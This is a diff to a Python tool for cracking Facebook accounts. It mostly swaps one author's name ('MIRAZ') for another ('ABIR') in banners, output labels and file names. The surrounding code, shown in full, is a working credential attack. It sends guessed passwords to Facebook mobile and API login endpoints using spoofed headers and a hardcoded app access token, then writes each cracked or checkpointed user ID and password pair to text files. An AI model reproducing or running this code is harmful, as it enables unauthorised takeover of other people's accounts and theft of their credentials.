@@ -84,7 +84,7 @@ def clear():
 def back():
 	login()
 
-MIRAZ="MIRAZ-"
+ABIR="ABIR-"
 imt="-Busra4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
@@ -362,7 +362,7 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ MIRAZ-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ ABIR-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -418,7 +418,7 @@ __________________×______________________
   
   Owner   :  ABIR ERROR
  
-  Github   :  RATBOX
+  Github   : https://github.com/abirahmed20/
   
   Contact : +880**********
 __________________×______________________\033[1;37m""")
@@ -866,15 +866,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MIRAZ-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ABIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MIRAZ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ABIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MIRAZ-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ABIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MIRAZ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ABIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1293,15 +1293,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MIRAZ-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ABIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MIRAZ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ABIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MIRAZ-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ABIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MIRAZ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ABIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
